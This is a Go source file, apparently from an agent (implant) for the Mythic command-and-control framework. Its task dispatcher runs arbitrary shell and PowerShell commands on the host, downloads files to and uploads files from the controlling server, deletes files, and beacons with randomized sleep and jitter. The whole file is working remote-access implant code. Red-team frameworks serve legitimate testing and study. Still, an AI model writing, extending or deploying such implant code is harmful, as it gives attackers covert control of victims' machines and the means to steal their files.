package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// commandEntry is one row of the dispatch table. To add a command, add a
// row plus a handler here, register it in the container commandSpecs and
// add it to the C table in agent_code_c/tasks.c. Handlers return the
// response body; dispatch fills TaskID and Completed.
type commandEntry struct {
	name string
	run  func(a *Agent, t Task) (Response, bool)
}

var commandTable = []commandEntry{
	{name: "shell", run: handleShell},
	{name: "powershell", run: handlePowershell},
	{name: "sleep", run: handleSleep},
	{name: "ls", run: handleLs},
	{name: "download", run: handleDownload},
	{name: "upload", run: handleUpload},
	{name: "rm", run: handleRm},
	{name: "mkdir", run: handleMkdir},
	{name: "exit", run: handleExit},
}

// dispatch runs one task and reports whether the agent must exit afterwards.
func (a *Agent) dispatch(t Task) (Response, bool) {
	entry := findCommand(t.Command)
	if entry == nil {
		out := "error: unknown command " + t.Command
		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
	}
	if !commandAllowed(t.Command) {
		out := "error: command " + t.Command + " not included in this build"
		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
	}
	resp, exit := entry.run(a, t)
	resp.TaskID, resp.Completed = t.ID, true
	return resp, exit
}

func findCommand(name string) *commandEntry {
	for i := range commandTable {
		if commandTable[i].name == name {
			return &commandTable[i]
		}
	}
	return nil
}

// commandAllowed reports whether name is in the build-time command list.
// An empty list (offline builds without -X) allows everything.
func commandAllowed(name string) bool {
	if strings.TrimSpace(includedCommands) == "" {
		return true
	}
	for _, c := range strings.Split(includedCommands, ",") {
		if strings.TrimSpace(c) == name {
			return true
		}
	}
	return false
}

func errResponse(err error) (Response, bool) {
	out := "error: " + err.Error()
	return Response{UserOutput: out, Status: out}, false
}

func handleShell(_ *Agent, t Task) (Response, bool) {
	out, err := runShell(taskArg(t.Parameters))
	if err != nil {
		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handlePowershell(_ *Agent, t Task) (Response, bool) {
	out, err := runPowershell(taskArg(t.Parameters))
	if err != nil {
		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handleSleep(a *Agent, t Task) (Response, bool) {
	interval, jitter, err := parseSleep(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	a.interval, a.jitter = interval, jitter
	return Response{
		UserOutput: fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter),
		Status:     "success",
	}, false
}

func handleLs(_ *Agent, t Task) (Response, bool) {
	text, fb, err := listDir(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: text, Status: "success", FileBrowser: fb}, false
}

func handleDownload(a *Agent, t Task) (Response, bool) {
	out, err := downloadToMythic(t.ID, taskArg(t.Parameters), a.chunkSize(), a.postResponses)
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handleUpload(a *Agent, t Task) (Response, bool) {
	out, err := uploadFromMythic(t.ID, taskParam(t.Parameters, "file"),
		taskParam(t.Parameters, "remote_path"), a.chunkSize(), a.postResponses)
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handleRm(_ *Agent, t Task) (Response, bool) {
	removed, out, err := removePath(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success", RemovedFiles: &removed}, false
}

func handleMkdir(_ *Agent, t Task) (Response, bool) {
	out, err := makeDir(taskArg(t.Parameters))
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success"}, false
}

func handleExit(_ *Agent, _ Task) (Response, bool) {
	return Response{UserOutput: "exiting", Status: "success"}, true
}

func runShell(arg string) (string, error) {
	name, flag := "cmd.exe", "/c"
	if runtime.GOOS != "windows" {
		name, flag = "sh", "-c"
	}
	return runCmd(name, flag, arg)
}

func runPowershell(arg string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("powershell needs Windows")
	}
	return runCmd("powershell.exe", "/c", arg)
}

func runCmd(name, flag, arg string) (string, error) {
	cmd := exec.Command(name, flag, arg)
	cmd.Env = os.Environ()
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// parseSleep reads "interval [jitter]" in seconds, e.g. "60 10".
func parseSleep(arg string) (int, int, error) {
	fields := strings.Fields(arg)
	if len(fields) == 0 || len(fields) > 2 {
		return 0, 0, fmt.Errorf("usage: sleep <interval> [jitter]")
	}
	interval, err := strconv.Atoi(fields[0])
	if err != nil || interval < 0 {
		return 0, 0, fmt.Errorf("bad interval %q", fields[0])
	}
	jitter := 0
	if len(fields) == 2 {
		jitter, err = strconv.Atoi(fields[1])
		if err != nil || jitter < 0 || jitter > 100 {
			return 0, 0, fmt.Errorf("bad jitter %q", fields[1])
		}
	}
	return interval, jitter, nil
}

// sleepTime mirrors Thanatos: interval plus/minus jitter percent.
func sleepTime(interval, jitter int) time.Duration {
	if interval <= 0 {
		return 0
	}
	if jitter <= 0 {
		return time.Duration(interval) * time.Second
	}
	delta := interval * jitter / 100
	low := interval - delta
	if low < 0 {
		low = 0
	}
	n := low
	if span := interval + delta - low; span > 0 {
		n = low + rand.Intn(span+1) //nolint:gosec // jitter needs no CSPRNG
	}
	return time.Duration(n) * time.Second
}
